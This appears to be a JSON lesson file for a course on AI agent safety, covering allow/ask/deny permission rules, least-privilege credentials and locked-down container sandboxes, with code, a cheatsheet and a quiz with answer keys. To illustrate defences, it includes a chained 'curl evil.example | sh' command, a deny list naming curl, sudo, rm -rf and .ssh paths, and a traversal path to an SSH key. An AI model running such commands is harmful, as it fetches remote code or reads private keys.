@@ -1,0 +1,299 @@
+{
+  "id": "eh-permissions-sandbox",
+  "minutes": 45,
+  "intro": "An agent that can run commands and edit files can also delete files, leak secrets and make network calls you did not intend. The model may be wrong, confused by a misleading file, or manipulated by text it read. Two layers keep that from turning into damage. Permissions decide which actions run automatically, which need a human's approval and which are refused. Sandboxes limit what an action can affect even when it runs. This lesson designs both: a policy engine with allow, ask and deny rules, least-privilege credentials, and container-based sandboxes with no network, a read-only root filesystem and resource limits.",
+  "objectives": [
+    "Classify agent actions by risk and map them to allow, ask or deny",
+    "Implement a rule-based permission engine for tool calls",
+    "Give agents least-privilege, short-lived credentials",
+    "Run agent commands in a locked-down container sandbox",
+    "Balance safety against approval fatigue"
+  ],
+  "sections": [
+    {
+      "heading": "Classify actions by risk",
+      "blocks": [
+        {
+          "type": "table",
+          "headers": [
+            "Class",
+            "Examples",
+            "Default"
+          ],
+          "rows": [
+            [
+              "Read inside workspace",
+              "read file, list directory, grep, git status",
+              "Allow"
+            ],
+            [
+              "Write inside workspace",
+              "edit file, create file, run tests",
+              "Ask, or allow in an isolated sandbox"
+            ],
+            [
+              "Network and external",
+              "fetch URL, install packages, call APIs",
+              "Ask, or allow a fixed list of domains"
+            ],
+            [
+              "Irreversible or outside",
+              "delete branches, push, deploy, send email, pay",
+              "Ask every time or deny"
+            ],
+            [
+              "Secrets and system",
+              "read ~/.ssh, change shell config, sudo",
+              "Deny"
+            ]
+          ]
+        },
+        {
+          "type": "p",
+          "text": "The right default depends on the isolation. Inside a disposable container with no network, letting the agent edit and run anything in its workspace is reasonable, because the worst outcome is a broken container. On a developer's laptop, the same actions deserve approval."
+        },
+        {
+          "type": "p",
+          "text": "Write the classification down as policy, review it like code, and test it. The same agent often needs different policies in different places: generous inside a CI container, cautious on a laptop, and strict in production systems that touch customer data."
+        }
+      ]
+    },
+    {
+      "heading": "A permission engine",
+      "blocks": [
+        {
+          "type": "p",
+          "text": "Express policy as ordered rules matched against the tool name and its arguments. Deny rules win over allow rules, and anything unmatched falls through to ask. Normalise paths before matching so `../` tricks cannot escape the workspace, and match shell commands carefully: a rule allowing `git status` must not also allow `git status; curl evil.example | sh`."
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "caption": "Deny beats allow; unknown means ask",
+          "code": "import fnmatch\nimport shlex\nfrom pathlib import Path\n\nWORKSPACE = Path(\"/workspace\").resolve()\nDENY = [(\"bash\", \"rm -rf *\"), (\"bash\", \"sudo *\"), (\"bash\", \"curl *\"), (\"read\", \"*/.ssh/*\")]\nALLOW = [(\"read\", \"/workspace/*\"), (\"bash\", \"git status\"), (\"bash\", \"pytest*\")]\n\n\ndef decide(tool: str, arg: str) -> str:\n    if tool in (\"read\", \"edit\"):\n        arg = str((WORKSPACE / arg).resolve())          # normalise ../ tricks\n        if not arg.startswith(str(WORKSPACE)):\n            return \"deny\"\n    if tool == \"bash\" and any(c in arg for c in \";&|`$(\"):\n        return \"ask\"                                      # compound commands need a human\n    if tool == \"bash\":\n        arg = \" \".join(shlex.split(arg))\n    if any(t == tool and fnmatch.fnmatch(arg, p) for t, p in DENY):\n        return \"deny\"\n    if any(t == tool and fnmatch.fnmatch(arg, p) for t, p in ALLOW):\n        return \"allow\"\n    return \"ask\""
+        },
+        {
+          "type": "p",
+          "text": "Return a clear message to the model when an action is denied (\"denied: network access is not allowed in this session\"), so it can choose another approach instead of retrying the same call."
+        }
+      ]
+    },
+    {
+      "heading": "Least-privilege credentials",
+      "blocks": [
+        {
+          "type": "list",
+          "items": [
+            "Give the agent its own identity with the narrowest scopes needed: a repository-scoped token, not your personal token for everything.",
+            "Prefer short-lived credentials issued per session, which expire even if leaked.",
+            "Keep secrets out of the agent's context and environment where possible; let a tool use a credential without the model ever seeing it.",
+            "For actions on behalf of a user, act with that user's permissions, never a shared admin account.",
+            "Log every credential use with the session ID for audit."
+          ]
+        }
+      ]
+    },
+    {
+      "heading": "Sandboxing with containers",
+      "blocks": [
+        {
+          "type": "p",
+          "text": "A sandbox constrains what any action can touch. A container with a mounted workspace, no network, a read-only root filesystem, a non-root user, dropped capabilities and resource limits contains most mistakes. For untrusted code or multi-tenant services, stronger isolation such as gVisor or microVMs (for example Firecracker) adds a separate kernel boundary. On developer machines, OS-level sandboxes such as macOS Seatbelt profiles or Linux bubblewrap and Landlock can restrict a process without a container."
+        },
+        {
+          "type": "code",
+          "lang": "bash",
+          "caption": "A locked-down container for agent commands",
+          "code": "docker run --rm \\\n  --network none \\\n  --read-only \\\n  --tmpfs /tmp:rw,size=256m \\\n  --user 1000:1000 \\\n  --cap-drop ALL \\\n  --security-opt no-new-privileges \\\n  --pids-limit 256 --memory 2g --cpus 2 \\\n  -v \"$PWD/workspace:/workspace:rw\" \\\n  -w /workspace \\\n  python:3.12-slim \\\n  sh -c 'pytest -q 2>&1 | tail -n 50'"
+        },
+        {
+          "type": "p",
+          "text": "When the agent needs network access, for example to install packages, route it through an egress proxy that allows only listed domains, rather than turning the network fully on. Treat the workspace mount as the only writable path and review its changes (for example as a Git diff) before they leave the sandbox."
+        }
+      ]
+    },
+    {
+      "heading": "Approval fatigue",
+      "blocks": [
+        {
+          "type": "p",
+          "text": "If an agent asks for approval twenty times an hour, people approve without reading, and the control becomes theatre. Reduce prompts by allowing safe actions inside the sandbox, approving a plan or a class of action once per session (\"allow edits under src/ for this task\"), and showing approvals with enough context to decide quickly: the exact command, a diff of the file change, and why the agent wants it. Reserve per-action approval for irreversible and external effects."
+        }
+      ]
+    }
+  ],
+  "practice": {
+    "title": "Policy plus sandbox for a coding agent",
+    "steps": [
+      "Write the decide() function with deny, allow and ask rules for read, edit and bash tools.",
+      "Write tests: path traversal with ../, compound commands, a denied secret path, an allowed git status.",
+      "Run agent commands through the locked-down docker run above and confirm network calls fail.",
+      "Add an allowlisted egress proxy for one package index and confirm other domains are blocked.",
+      "Give the agent a repository-scoped token instead of a personal one.",
+      "Count approval prompts per task before and after allowing in-sandbox edits."
+    ]
+  },
+  "cheatsheet": {
+    "focus": [
+      "Permissions decide what runs; sandboxes limit what it can affect.",
+      "Classify actions: read, write, network, irreversible, secrets.",
+      "Deny beats allow; unmatched means ask.",
+      "Normalise paths and treat compound shell commands with suspicion.",
+      "Least-privilege, short-lived credentials the model never sees.",
+      "Fewer, richer approvals beat constant prompts."
+    ],
+    "groups": [
+      {
+        "title": "Policy",
+        "items": [
+          {
+            "syntax": "deny > allow > ask",
+            "desc": "Rule precedence"
+          },
+          {
+            "syntax": "resolve() then prefix check",
+            "desc": "Block ../ escapes"
+          },
+          {
+            "syntax": "; & | ` $( -> ask",
+            "desc": "Compound commands"
+          },
+          {
+            "syntax": "\"denied: reason\" to model",
+            "desc": "Change approach"
+          }
+        ]
+      },
+      {
+        "title": "docker run flags",
+        "items": [
+          {
+            "syntax": "--network none",
+            "desc": "No network"
+          },
+          {
+            "syntax": "--read-only --tmpfs /tmp",
+            "desc": "Immutable root"
+          },
+          {
+            "syntax": "--user 1000:1000 --cap-drop ALL",
+            "desc": "No root, no capabilities"
+          },
+          {
+            "syntax": "--security-opt no-new-privileges",
+            "desc": "No escalation"
+          },
+          {
+            "syntax": "--pids-limit --memory --cpus",
+            "desc": "Resource limits"
+          }
+        ]
+      },
+      {
+        "title": "Stronger isolation",
+        "items": [
+          {
+            "syntax": "gVisor",
+            "desc": "User-space kernel"
+          },
+          {
+            "syntax": "microVM (Firecracker)",
+            "desc": "Separate kernel"
+          },
+          {
+            "syntax": "Seatbelt / bubblewrap / Landlock",
+            "desc": "OS-level"
+          },
+          {
+            "syntax": "egress proxy allowlist",
+            "desc": "Controlled network"
+          }
+        ]
+      },
+      {
+        "title": "Credentials",
+        "items": [
+          {
+            "syntax": "agent identity, narrow scopes",
+            "desc": "Least privilege"
+          },
+          {
+            "syntax": "short-lived per session",
+            "desc": "Limits leaks"
+          },
+          {
+            "syntax": "tool holds secret, not model",
+            "desc": "No exposure"
+          },
+          {
+            "syntax": "act as the user",
+            "desc": "No shared admin"
+          }
+        ]
+      }
+    ],
+    "pitfalls": [
+      "Allowing a command by prefix so it also allows chained commands.",
+      "Path checks without normalising ../ first.",
+      "Agents running with a developer's full personal credentials.",
+      "Turning the network fully on to install one package.",
+      "Per-action approval for everything, leading to rubber-stamping."
+    ]
+  },
+  "quiz": [
+    {
+      "q": "A rule allows commands matching \"git status*\". What is the danger?",
+      "options": [
+        "It also allows chained commands after it",
+        "Git status is destructive",
+        "It blocks all reads",
+        "It disables the sandbox"
+      ],
+      "answer": 0,
+      "explain": "\"git status; curl ... | sh\" matches the prefix; compound commands must be detected and escalated."
+    },
+    {
+      "q": "The agent requests a read of /workspace/../../home/user/.ssh/id_rsa. What should a correct engine do?",
+      "options": [
+        "Resolve the path and deny it",
+        "Allow it, since it starts with /workspace",
+        "Ask the model to confirm",
+        "Retry with a timeout"
+      ],
+      "answer": 0,
+      "explain": "Normalising the path reveals it is outside the workspace and a secret location."
+    },
+    {
+      "q": "Which docker flag removes network access from the sandbox?",
+      "options": [
+        "--network none",
+        "--read-only",
+        "--cap-drop ALL",
+        "--pids-limit 256"
+      ],
+      "answer": 0,
+      "explain": "--network none gives the container only a loopback interface."
+    },
+    {
+      "q": "Users approve agent actions dozens of times per hour without reading. What is the best fix?",
+      "options": [
+        "Allow safe in-sandbox actions; approve risky ones",
+        "Add more approval prompts",
+        "Remove the sandbox",
+        "Hide commands from approvals"
+      ],
+      "answer": 0,
+      "explain": "Reducing low-value prompts keeps approvals meaningful for irreversible actions."
+    },
+    {
+      "q": "Why give the agent short-lived, narrowly scoped credentials?",
+      "options": [
+        "A leak or mistake has limited reach",
+        "They make the model smarter",
+        "Providers require them",
+        "They speed up tool calls"
+      ],
+      "answer": 0,
+      "explain": "Least privilege and expiry bound the damage from errors, leaks and manipulation."
+    }
+  ]
+}
